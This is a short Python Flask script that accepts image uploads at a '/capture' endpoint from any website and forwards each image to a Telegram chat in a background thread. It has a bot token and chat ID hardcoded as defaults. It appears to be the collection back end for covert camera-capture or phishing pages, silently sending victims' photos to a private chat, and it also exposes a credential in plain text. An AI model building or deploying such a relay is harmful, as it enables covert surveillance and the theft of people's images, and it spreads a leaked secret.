from flask import Flask, request
from flask_cors import CORS
import telegram
import threading
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8436537364:AAFi9kZYW0pg3Q85S9f2et0Mol8F-7CjX6I")
CHAT_ID = os.environ.get("CHAT_ID", "7802410095")

bot = telegram.Bot(token=BOT_TOKEN)

def send_photo_async(image_bytes):
    bot.send_photo(chat_id=CHAT_ID, photo=image_bytes)

@app.route("/capture", methods=["POST"])
def capture():
    image = request.files["image"]
    img_bytes = image.read()

    # Send async → NO blocking → NO lag
    threading.Thread(
        target=send_photo_async,
        args=(img_bytes,)
    ).start()

    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
